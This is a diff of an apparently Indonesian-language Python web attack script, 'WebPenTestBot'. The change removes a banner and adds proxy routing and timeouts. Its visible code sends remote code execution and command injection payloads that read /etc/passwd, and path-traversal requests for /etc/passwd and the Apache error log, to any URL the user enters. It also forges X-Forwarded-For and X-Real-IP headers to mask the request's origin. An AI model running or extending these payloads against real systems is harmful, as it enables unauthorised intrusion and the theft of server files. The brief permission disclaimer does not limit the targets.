@@ -6,54 +6,13 @@ import threading
 import base64
 from urllib.parse import quote_plus
 
-R = '\033[91m'  # Red
-G = '\033[92m'  # Green
-Y = '\033[93m'  # Yellow
-B = '\033[94m'  # Blue
-M = '\033[95m'  # Magenta
-C = '\033[96m'  # Cyan
-N = '\033[0m'   # Reset
-
-def banner():
-    print(f"""{G}
--------------------------{R}######{G}-------------------------
----------------------{R}######{G}--{R}######{G}---------------------
-------------------{R}###{G}--------------{R}###{G}------------------
----------------{R}####{G}------------------{R}####{G}---------------
---------------{R}#{G}-{R}#{G}--------------------{R}#{G}-{R}#{G}-{R}#{G}--------------
---------------{R}##{G}------------------------{R}##{G}--------------
--------------{R}#{G}----------------------------{R}#{G}-------------
-------------{R}#{G}-------------{R}####{G}-------------{R}#{G}------------
--------------------------{R}######{G}-------------------------
------------{R}#{G}--------{R}##{G}----{R}####{G}----{R}##{G}--------{R}#{G}-----------
-----------{R}#{G}-------{R}######{G}---{R}##{G}---{R}######{G}-------{R}#{G}----------
----------{R}#{G}-----------------{R}##{G}----------------{R}##{G}---------
---------{R}#{G}--------{R}######################{G}-------{R}##{G}--------
------------------{R}######################{G}-----------------
--------{R}#{G}--------------{R}##{G}---{R}##{G}---{R}##{G}--------------{R}#{G}-------
-------------------{R}#{G}---{R}###{G}------{R}###{G}---{R}#{G}------------------
---------{R}#{G}----------{R}#{G}-------{R}##{G}-------{R}#{G}----------{R}#{G}--------
----------{R}#{G}----------{R}##{G}-{R}####{G}--{R}#######{G}----------{R}#{G}---------
-------------{R}#{G}---------{R}#####{G}--{R}#####{G}---------{R}#{G}------------
-----------{R}#{G}-------------{R}###{G}--{R}###{G}-------------{R}#{G}----------
------------{R}##{G}------------------------------{R}##{G}-----------
--------{R}#####{G}--------------------------------{R}#####{G}-------
-----{R}###{G}-{R}#{G}--------------------------------------{R}#{G}-{R}###{G}----
---------------------------------------------------------
---------------------------------------------------------
-----------------------{R}#{G}----------{R}#{G}----------------------
-----------------------{R}#{G}----------{R}#{G}----------------------
----------------------------------{R}#{G}----------------------
-    """)
-    print("Printing banner...")
-    print(f"{R}                                                                                   {N}")
-    print(f"{R} ,-----.         ,--.                 ,--.                                         {N}")
-    print(f"{Y}'  .--./,--. ,--.|  |-.  ,---. ,--.--.|  ,---.  ,---. ,--.--. ,---.  ,---.  ,---.  {N}")
-    print(f"{G}|  |     \\  '  /| .-. '| .-. :|  .--'|  .-.  || .-. :|  .--' | .-. || .-. (  .-'  {N}")
-    print(f"{C}'  '--'\\  \\   '| `-'  \\  --.|  |   |  | |  |\\  --.|  |    ' '-' \\ `---..-'  `) {N}")
-    print(f"{M} `-----'.-'  /    `---'  `----'`--'   `--' `--' `----'`--'    `---'  `----'`----'  {N}")
-    print(f"{Y}        `---'                                                                       {N}")
-    print("Banner printed.")  
+R = '\033[91m'  
+G = '\033[92m'  
+Y = '\033[93m'  
+B = '\033[94m'  
+M = '\033[95m'  
+C = '\033[96m'  
+N = '\033[0m'   
 
 class Colors:
     RESET = "\033[0m"
@@ -66,14 +25,22 @@ class Colors:
     WHITE = "\033[37m"
 
 class WebPenTestBot:
-    def __init__(self, base_url):
+    def __init__(self, base_url, proxy=None):
         self.base_url = base_url
+        self.proxy = proxy
         self.session = requests.Session()
         self.session.headers.update({
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
             'X-Forwarded-For': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)),
             'X-Real-IP': str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255)) + '.' + str(random.randint(1, 255))
         })
+        
+        if self.proxy:
+            self.session.proxies = {
+                'http': self.proxy,
+                'https': self.proxy,
+            }
+
         print(f"{Colors.MAGENTA}Disclaimer: Pastikan Anda memiliki izin eksplisit untuk melakukan pengujian ini.{Colors.RESET}")
         self.log_file = 'pentest_results.log'
 
@@ -82,12 +49,12 @@ class WebPenTestBot:
             log.write(message + '\n')
         print(f"{color}{message}{Colors.RESET}")
 
-    def get_html(self, path, retries=3):
+    def get_html(self, path, retries=3, timeout=5):
         url = self.base_url + path
         attempt = 0
         while attempt < retries:
             try:
-                response = self.session.get(url, timeout=3)
+                response = self.session.get(url, timeout=timeout)
                 response.raise_for_status()
                 return response.text
             except requests.exceptions.RequestException as e:
@@ -117,7 +84,7 @@ class WebPenTestBot:
         return response.text
 
     def test_remote_code_execution(self, path):
-        payload = {'cmd': 'cat /etc/passwd'}  # Mengambil data sistem penting
+        payload = {'cmd': 'cat /etc/passwd'}
         url = self.base_url + path
         response = self.session.post(url, data=payload)
 
@@ -131,7 +98,7 @@ class WebPenTestBot:
         return response.text
 
     def test_command_injection(self, path):
-        payload = {'input': '$(cat /etc/passwd)'}  # Mengambil data sistem penting
+        payload = {'input': '$(cat /etc/passwd)'}
         url = self.base_url + path
         response = self.session.get(url, params=payload)
 
@@ -145,13 +112,13 @@ class WebPenTestBot:
         return response.text
 
     def test_local_file_inclusion(self, path):
-        payload = {'file': '../../etc/passwd'}  # Mengakses file penting pada server
+        payload = {'file': '../../etc/passwd'}
         url = self.base_url + path
         response = self.session.get(url, params=payload)
 
         if 'root:' in response.text:
             self.log(f"{Colors.GREEN}[!] Eksploitasi LFI berhasil, file /etc/passwd berhasil diakses di {url}{Colors.RESET}")
-            payload = {'file': '../../var/log/apache2/error.log'}  # Mengakses file log server
+            payload = {'file': '../../var/log/apache2/error.log'}
             response = self.session.get(url, params=payload)
             if response.status_code == 200:
                 self.log(f"{Colors.GREEN}[!] Akses file log server yang berbahaya: {response.text[:500]}{Colors.RESET}")
@@ -215,5 +182,6 @@ if __name__ == "__main__":
     if not target_url.startswith("http://") and not target_url.startswith("https://"):
         print(f"{Colors.RED}URL tidak valid. Pastikan URL dimulai dengan http:// atau https://{Colors.RESET}")
     else:
-        bot = WebPenTestBot(target_url)
+        proxy = input(f"{Colors.CYAN}Masukkan proxy (misal: http://127.0.0.1:8080) atau tekan Enter untuk melewati: {Colors.RESET}")
+        bot = WebPenTestBot(target_url, proxy if proxy else None)
         bot.analyze_site()
